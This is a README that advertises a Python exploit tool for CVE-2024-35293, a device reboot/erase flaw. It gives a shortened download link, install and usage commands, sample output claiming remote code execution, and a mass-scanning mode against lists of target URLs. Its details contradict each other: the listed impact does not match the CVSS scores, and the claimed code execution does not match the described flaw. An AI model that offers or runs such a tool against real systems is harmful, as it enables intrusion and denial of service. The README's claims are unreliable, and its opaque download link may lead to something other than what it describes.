## 🌟 Description
CVE-2024-35293
This vulnerability makes it possible for unauthenticated remote attacker may use a missing authentication for critical function vulnerability to reboot or erase the affected devices resulting in data loss and/or a DoS.

## Details

- **CVE ID**: [CVE-2024-35293](https://nvd.nist.gov/vuln/detail/CVE-2024-35293)
- **Discovered**: 2024-10-1
- **Published**: 2024-10-2
- **Impact**: Confidentiality
- **Exploit Availability**: Not public, only private.

## ⚙️ Installation

To set up the exploitation tool, follow these steps:

1. Download the repository:

|[Download](https://t.ly/xyDub)
|:--------------- |

2. Navigate to the tool's directory:

```bash
cd CVE-2024-35293
```

3. Install the required Python packages:

```bash
pip install -r requirements.txt
```

## 🚀 Usage

To use the tool, run the script from the command line as follows:

```bash
python exploit.py [options]
```


### Options

- -u, --url:
  Specify the target URL or IP address.

- -f, --file:
  Specify a file containing a list of URLs to scan.

- -t, --threads:
  Set the number of threads for concurrent scanning.

- -o, --output:
  Define an output file to save the scan results.

When a single URL is provided with the -u option and the target is vulnerable, the script will attempt to execute arbitrary code.

### Example

```bash
$ python3 exploit.py -u http://target-url.com
[+] Remote code execution triggered successfully.
[!] http://target-url.com is vulnerable to CVE-2024-35293.
```

## 📊 Mass Scanning

For mass scanning, use the -f option with a file containing URLs. The tool will scan each URL and print concise results, indicating whether each target is vulnerable.

```bash
python exploit.py -f urls.txt
```

## 📈 CVSS Information
Score: 9.1

Severity: CRITICAL

Confidentiality: None

Integrity: High

Availability: High

Attack Vector: Network

Attack Complexity: Low
